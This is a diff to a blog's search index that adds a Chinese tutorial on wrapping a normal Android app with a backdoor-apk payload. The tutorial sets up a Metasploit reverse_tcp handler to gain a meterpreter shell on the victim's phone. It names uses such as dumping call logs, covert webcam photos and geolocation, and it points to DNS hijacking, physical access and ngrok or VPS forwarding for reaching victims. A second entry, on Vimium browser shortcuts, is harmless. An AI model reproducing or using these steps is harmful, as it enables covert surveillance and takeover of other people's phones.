@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[生成apk后门实现msf控制安卓手机]]></title>
+    <url>%2F2018%2F03%2F02%2Fbackdoor-apk%2F</url>
+    <content type="text"><![CDATA[======================== 实验环境： Kali Linux android 同一局域网 生成后门安装依赖环境 apt-get install lib32z1 lib32ncurses5 lib32stdc++6 下载 backdoor-apk git clone https://github.com/dana-at-cp/backdoor-apk.git 下载完成后进入文件目录 cd backdoor-apk/backdoor-apk 将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行 ./backdoor-apk.sh test.apkPS:test.apk 为事先准备好的正常apk应用名 选择payload 出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件 meterpreter执行 msfconsole -r backdoor-apk.rc 手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell可以看到获得反弹shell 会话用sessions -i number 切换到当前会话此处执行check_root 测试其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等 可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样12345use exploit/multi/handler set payload android/meterpreter/reverse_tcp set lhost 192.168.0.105 set lport 8888 exploit 问题 [!] Failed to recompile original project with backdoor 现在很多应用都会做一些处理防止反编译，可以上 APKPure 或酷安 去找一些历史版本会增加成功概率 apktools 过旧，可以把Kail 更到最新 一定要把 apk 放到backdoor-apk.sh 所在目录下 拓展 外网环境可使用vps转发 或 ngrok穿透 参考 vps 转发 http://www.freebuf.com/sectool/136574.html ngrok穿透 http://www.freebuf.com/sectool/162046.html 植入木马方式 内网dns劫持: http://www.freebuf.com/sectool/136574.html 物理接触 参考 http://www.secist.com/archives/680.html http://www.4hou.com/mobile/8290.html]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[Vimium 入门]]></title>
     <url>%2F2018%2F02%2F28%2FVimium-use%2F</url>
     <content type="text"><![CDATA[======================== vimium 介绍Vimium 是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升一定要试试这个插件。 下载地址：ChromeFirefox Vimium使用总结 页内浏览 j:向下滚动一点 k:向上滚动一点 gg:到页面最底部 G:到页面最底部 d:向下翻一屏 u:向上翻一屏 gs:查看源代码 gi:聚焦到第一个输入点 i/Esc: 输入模式/命令模式 快速选取 /:快速查找 [n] 向下匹配项 [N]向上匹配 yy:拷贝当前页面的URL yf:拷贝指定URL V:选取指定段内容 标签操作 t:创建一个新标签 T:显示所有标签 J:上一个标签 K:下一个标签 x:关闭当前标签 X:恢复上个关闭的标签 r:重新加载 [F5] 导航操作 p/P : 打开剪贴板内的链接,否则进行搜索 o/O:从收藏夹、历史记录打开：如果你输的是一个网址，回车还能直接打开 f/F: 快速打开某链接 gf：跳到父页面 H:回退上一个历史页面 [&lt;-] L:回到下一个历史页面 [-&gt;] 浏览器快捷键 ctrl+w: 关闭当前页面 ctrl+t: 新建标签 F6: 在当前页面输入URL ctrl+d: 为当前页添加书签 其他某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带键盘映射。]]></content>
